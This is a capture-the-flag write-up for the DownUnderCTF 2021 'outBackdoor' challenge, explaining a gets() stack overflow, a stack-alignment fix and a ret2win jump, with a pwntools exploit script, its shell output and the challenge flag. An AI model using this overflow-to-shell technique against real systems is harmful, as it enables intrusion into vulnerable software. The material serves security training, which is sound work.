# DownUnderCTF 2021

## outBackdoor

> 100
> 
> Fool me once, shame on you. Fool me twice, shame on me.
> 
> Author: xXl33t_h@x0rXx
>
> `nc pwn-2021.duc.tf 31921`
>
> [`outbackdoor`](outbackdoor)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _ret2win_


## Summary

Basic _ret2win_ with a bonus stack alignment issue.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO = GOT overwrite; No PIE = Easy ROP; No canary = Easy BOF.


### Decompile with Ghidra   

```c
undefined8 main(void)
{
  char local_18 [16];
  
  buffer_init();
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(local_18);
  return 0;
}

void outBackdoor(void)
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  system("/bin/sh");
  return;
}
```

`gets(local_18);` is your vuln.  With no canary and no PIE, this is a simple `ret2win`.

`local_18` is `0x18` bytes from the return address, so just send `0x18` of garbage followed by the address of `outBackdoor`.

However...

It will crash ([stack alignment](https://blog.binpang.me/2019/07/12/stack-alignment/)).  Just test in GDB and It'll all make sense.  Also click the link aforementioned link.

There's two ways _out_ of this:

1. Create a ROP chain starting with `ret` to move the stack pointer down.
2. Call `outBackdoor+1` to avoid the `PUSH RBP` instruction.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./outbackdoor')

if args.REMOTE:
    p = remote('pwn-2021.duc.tf', 31921)
else:
    p = process(binary.path)

payload  = b''
payload += 0x18 * b'A'
payload += p64(binary.sym.outBackdoor+1)

p.sendlineafter(b'song?\n', payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2021/outbackdoor/outbackdoor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn-2021.duc.tf on port 31921: Done
[*] Switching to interactive mode


W...w...Wait? Who put this backdoor out back here?
$ cat flag.txt
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
```
